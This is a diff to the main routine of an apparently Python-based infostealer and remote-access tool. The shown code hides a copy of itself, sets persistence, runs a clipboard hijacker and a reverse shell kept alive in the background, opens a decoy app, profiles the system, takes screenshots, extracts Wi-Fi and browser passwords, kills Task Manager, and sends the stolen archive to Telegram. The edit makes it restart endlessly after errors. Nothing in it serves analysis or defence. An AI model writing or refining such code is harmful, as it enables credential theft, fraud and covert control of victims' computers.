@@ -649,56 +649,49 @@ def keep_reverse_shell_alive():
 
 
 def run():
-    try:
-        ensure_hidden_copy()
-        single_instance_check()
-        persist()
+    ensure_hidden_copy()
 
-        threading.Thread(target=clipper_loop, daemon=True).start()
-        threading.Thread(target=keep_reverse_shell_alive, daemon=True).start()
-        launch_distraction_app()
+    # Only allow ONE instance ever (main or hidden)
+    single_instance_check()
 
-        # wrap this entire block in try/except so it can’t take you down
-        try:
-            if not already_exfiltrated():
-                profile_system()
-                take_screenshot()
-                if check_webcam():
-                    with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w") as f:
-                        f.write("Webcam detected.")
-                extract_wifi()
-                detect_vm()
-                kill_taskmgr_once()
-                clipper()
-                steal_browser()
-                steal_firefox_passwords()
-                send_zip_to_telegram()
-                mark_exfiltrated()
-        except Exception as e:
-            # optionally log e to a file so you can diagnose exactly what failed
-            with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a") as log:
-                log.write(f"profile/exfil phase failed: {e}\n")
+    # Always make sure persistence is set
+    persist()
 
-        fake_input()
+    # From here, run logic ONCE (original or copied, doesn't matter)
+    threading.Thread(target=clipper_loop, daemon=True).start()
+    threading.Thread(target=keep_reverse_shell_alive, daemon=True).start()
+    # launch_distraction_app()
+    launch_distraction_app()
 
-        # THIS infinite loop *must* live inside run(), so run() never returns
-        while True:
-            time.sleep(10)
+    if not already_exfiltrated():
+        profile_system()
+        take_screenshot()
+        if check_webcam():
+            with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w") as f:
+                f.write("Webcam detected.")
+        extract_wifi()
+        detect_vm()
+        kill_taskmgr_once()
+        clipper()
+        steal_browser()
+        steal_firefox_passwords()
+        send_zip_to_telegram()
+        mark_exfiltrated()
 
-    except Exception as e:
-        # catch literally anything else
-        with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a") as log:
-            log.write(f"run() fatal error: {e}\n")
-        # now fall into the infinite loop anyway
-        while True:
-            time.sleep(10)
+    fake_input()
 
+    while True:
+        time.sleep(10)
 
 
 
 
 if __name__ == "__main__":
-    run()
-
+    while True:
+        try:
+            run()
+        except Exception as e:
+            pass  # Optionally print or log this
+        time.sleep(30)
 
 
